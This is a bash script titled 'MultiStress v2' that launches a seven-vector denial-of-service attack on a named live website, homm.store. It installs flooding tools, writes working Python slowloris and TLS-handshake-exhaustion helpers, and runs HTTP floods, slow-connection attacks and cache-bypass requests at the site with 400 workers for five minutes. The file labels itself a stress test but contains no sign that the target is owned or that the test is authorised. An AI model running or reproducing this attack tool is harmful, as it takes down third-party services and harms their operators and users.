#!/bin/bash
# MultiStress v2 — macOS, no proxy
set -euo pipefail

TARGET="https://homm.store"
TARGET_HOST="homm.store"
TARGET_PORT=443
DURATION=300
WORKERS=400
LOG_DIR="/tmp/multistress_$(date +%s)"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; RESET='\033[0m'

PIDS=()

log()  { echo -e "${BOLD}[$(date +%H:%M:%S)]${RESET} $*"; }
ok()   { echo -e "${GREEN}  [OK]${RESET} $*"; }
warn() { echo -e "${YELLOW}  [WARN]${RESET} $*"; }

install_tools() {
  log "Checking dependencies..."

  if ! command -v brew &>/dev/null; then
    log "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  fi

  if ! command -v go &>/dev/null; then
    log "Installing Go..."
    brew install go
  fi
  export PATH="$PATH:$(go env GOPATH)/bin"

  command -v slowhttptest &>/dev/null || brew install slowhttptest 2>/dev/null || \
    warn "slowhttptest not available"

  python3 -m pip install -q PySocks 2>/dev/null || true

  for t in \
    "github.com/codesenberg/bombardier@latest" \
    "github.com/rakyll/hey@latest" \
    "github.com/tsenart/vegeta@latest" \
    "fortio.org/fortio@latest"; do
    name=$(basename "${t%@*}")
    command -v "$name" &>/dev/null || { log "Installing $name..."; go install "$t"; }
  done
  ok "All tools ready"
}

write_helpers() {
  cat > /tmp/slowloris.py << 'EOF'
import socket, ssl, time, threading, signal, sys, random, string

HOST, PORT, COUNT, TIMEOUT = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
sockets = []; lock = threading.Lock(); stop = threading.Event()

def make_sock():
    s = socket.socket(); s.settimeout(4)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=HOST); s.connect((HOST, PORT)); return s

def rand(n): return ''.join(random.choices(string.ascii_letters, k=n))

def open_all():
    for _ in range(COUNT):
        if stop.is_set(): break
        try:
            s = make_sock()
            s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            with lock: sockets.append(s)
        except: pass
    print(f"[slowloris] Opened {len(sockets)} connections", flush=True)

def keep():
    start = time.time()
    while not stop.is_set() and time.time()-start < TIMEOUT:
        dead = []
        with lock:
            for i,s in enumerate(sockets):
                try: s.send(f"X-A: {rand(6)}\r\n".encode())
                except: dead.append(i)
            for i in reversed(dead): sockets.pop(i)
        for _ in range(len(dead)):
            try:
                s = make_sock(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
                with lock: sockets.append(s)
            except: pass
        print(f"[slowloris] alive={len(sockets)} dropped={len(dead)}", flush=True)
        time.sleep(10)

signal.signal(signal.SIGTERM, lambda *_: stop.set())
open_all(); keep()
for s in sockets:
    try: s.close()
    except: pass
EOF

  cat > /tmp/ssl_exhaustion.py << 'EOF'
import ssl, socket, time, threading, signal, sys

HOST, PORT, THREADS, TIMEOUT = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
stop = threading.Event(); count = [0]; lock = threading.Lock()

def loop():
    while not stop.is_set():
        try:
            s = socket.socket(); s.settimeout(3)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            w = ctx.wrap_socket(s, server_hostname=HOST); w.connect((HOST, PORT)); w.close()
            with lock: count[0] += 1
        except: pass

signal.signal(signal.SIGTERM, lambda *_: stop.set())
ts = [threading.Thread(target=loop, daemon=True) for _ in range(THREADS)]
for t in ts: t.start()
start = time.time()
while time.time()-start < TIMEOUT and not stop.is_set():
    print(f"[ssl_exhaustion] {int(time.time()-start)}s handshakes={count[0]}", flush=True)
    time.sleep(5)
stop.set()
EOF
}

run_all() {
  mkdir -p "$LOG_DIR"
  write_helpers

  log "Launching 7 vectors on ${CYAN}$TARGET${RESET}\n"

  echo -e "${RED}[1/7 BOMBARDIER]${RESET}   HTTP/2 flood"
  bombardier -c "$WORKERS" -d "${DURATION}s" -t 1500ms --http2 --insecure -l "$TARGET" \
    > "$LOG_DIR/bombardier.log" 2>&1 & PIDS+=($!)

  echo -e "${GREEN}[2/7 HEY]${RESET}          HTTP/1.1 keep-alive"
  hey -c "$WORKERS" -z "${DURATION}s" "$TARGET" \
    > "$LOG_DIR/hey.log" 2>&1 & PIDS+=($!)

  echo -e "${YELLOW}[3/7 VEGETA]${RESET}       Constant-rate flood"
  echo "GET $TARGET" | vegeta attack -rate=0 -max-workers="$WORKERS" \
    -duration="${DURATION}s" -insecure | vegeta report -every=10s \
    > "$LOG_DIR/vegeta.log" 2>&1 & PIDS+=($!)

  echo -e "${CYAN}[4/7 FORTIO]${RESET}       Latency-aware flood"
  fortio load -c "$WORKERS" -t "${DURATION}s" -qps 0 -insecure "$TARGET" \
    > "$LOG_DIR/fortio.log" 2>&1 & PIDS+=($!)

  echo -e "${MAGENTA}[5/7 SLOWLORIS]${RESET}    Slow open connections"
  python3 /tmp/slowloris.py "$TARGET_HOST" "$TARGET_PORT" 200 "$DURATION" \
    > "$LOG_DIR/slowloris.log" 2>&1 & PIDS+=($!)

  echo -e "${BLUE}[6/7 SSL_EXHAUST]${RESET}  TLS handshake flood"
  python3 /tmp/ssl_exhaustion.py "$TARGET_HOST" "$TARGET_PORT" 100 "$DURATION" \
    > "$LOG_DIR/ssl_exhaustion.log" 2>&1 & PIDS+=($!)

  echo -e "${RED}[7/7 CACHE_BYPASS]${RESET} Random query string"
  hey -c "$WORKERS" -z "${DURATION}s" \
    -H "Cache-Control: no-cache" -H "Pragma: no-cache" \
    "${TARGET}?bust=$(jot -r 1 1 9999999)" \
    > "$LOG_DIR/cache_bypass.log" 2>&1 & PIDS+=($!)

  echo -e "\nLogs: ${BOLD}$LOG_DIR/${RESET} | Ctrl+C to stop\n"
  tail -f "$LOG_DIR"/*.log & PIDS+=($!)

  local start_ts=$(date +%s)
  while [[ $(( $(date +%s) - start_ts )) -lt $DURATION ]]; do
    local el=$(( $(date +%s) - start_ts ))
    local pct=$(( el * 100 / DURATION ))
    local f=$(( pct * 40 / 100 ))
    printf "\r[%-40s] %3d%% %ds/%ds" \
      "$(python3 -c "print('#'*$((f>0?f:1)) + '-'*$((40-f>0?40-f:1)))")" \
      "$pct" "$el" "$DURATION"
    sleep 2
  done

  echo -e "\n\n${GREEN}[OK] Done.${RESET}"
  for t in bombardier hey vegeta fortio slowloris ssl_exhaustion cache_bypass; do
    echo -e "\n${BOLD}[$t]${RESET}"; tail -8 "$LOG_DIR/$t.log" 2>/dev/null
  done
}

trap 'kill "${PIDS[@]}" 2>/dev/null; exit 0' INT TERM

echo -e "\n${BOLD}${RED}>> MULTISTRESS v2${RESET} — macOS — no proxy\n"
install_tools
run_all
